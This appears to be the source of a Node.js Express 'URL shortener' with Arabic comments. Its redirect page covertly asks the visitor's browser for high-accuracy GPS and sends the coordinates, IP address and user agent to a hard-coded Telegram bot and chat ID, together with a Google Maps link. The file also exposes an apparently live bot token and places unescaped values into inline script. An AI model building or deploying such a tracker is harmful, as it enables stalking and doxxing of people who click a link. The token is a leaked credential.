const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
  try {
    let msg = `
🔗 رابط فُتح!
━━━━━━━━━━━
📌 الكود: ${shortCode}
🌐 الرابط الأصلي: ${originalUrl}
🔌 IP: ${ip}
`;

    if (gps && gps.lat && gps.lng) {
      const accuracy = gps.accuracy ? gps.accuracy.toFixed(0) : '?';
      msg += `
📍 دائرة العرض: ${gps.lat}
📍 خط الطول: ${gps.lng}
📏 الدقة: ±${accuracy} متر
🗺️ الخريطة: https://maps.google.com/?q=${gps.lat},${gps.lng}
📡 النوع: GPS
`;
    } else {
      msg += `
⚠️ الموقع: لم يتم الحصول على GPS
`;
    }

    msg += `
━━━━━━━━━━━
🖥️ Device: ${userAgent.substring(0, 50)}
⏰ ${new Date().toISOString()}
    `.trim();

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: msg }
    );
    console.log('[Telegram] Message sent successfully');
  } catch (err) {
    console.error('[Telegram] Error:', err.message);
  }
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { 
    original: url, 
    created: new Date(), 
    clicks: 0
  };

  const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
  res.json({ shortened: shortenedUrl, code: shortCode });
});

// API لتسجيل الموقع
app.post('/api/log-visit', (req, res) => {
  const { code, gps } = req.body;
  
  console.log('[Log] Visit logged:', { code, gps });
  
  if (linkStorage[code]) {
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const userAgent = req.get('user-agent');
    const originalUrl = linkStorage[code].original;
    
    linkStorage[code].clicks++;
    
    // أرسل بدون انتظار
    sendToTelegram(ip, code, originalUrl, userAgent, gps);
  }
  
  res.json({ ok: true });
});

// Redirect فوري
app.get('/:code', (req, res) => {
  const { code } = req.params;
  if (!linkStorage[code]) return res.status(404).send('Not found');

  const originalUrl = linkStorage[code].original;
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
</head>
<body>
  <script>
    (function() {
      const code = '${code}';
      const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
      const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-visit';
      
      // Redirect فوري
      window.location.href = originalUrl;
      
      // جمع GPS في الخلفية
      setTimeout(() => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              // أرسل GPS
              fetch(apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  code: code,
                  gps: {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy
                  }
                }),
                keepalive: true
              }).catch(e => console.log('Fetch error:', e));
            },
            (error) => {
              // لو فشل GPS، أرسل بدونه
              fetch(apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  code: code,
                  gps: null
                }),
                keepalive: true
              }).catch(e => console.log('Fetch error:', e));
            },
            { 
              enableHighAccuracy: true,
              timeout: 3000,
              maximumAge: 0
            }
          );
        } else {
          // لو ما في GPS
          fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              code: code,
              gps: null
            }),
            keepalive: true
          }).catch(e => console.log('Fetch error:', e));
        }
      }, 100);
    })();
  </script>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));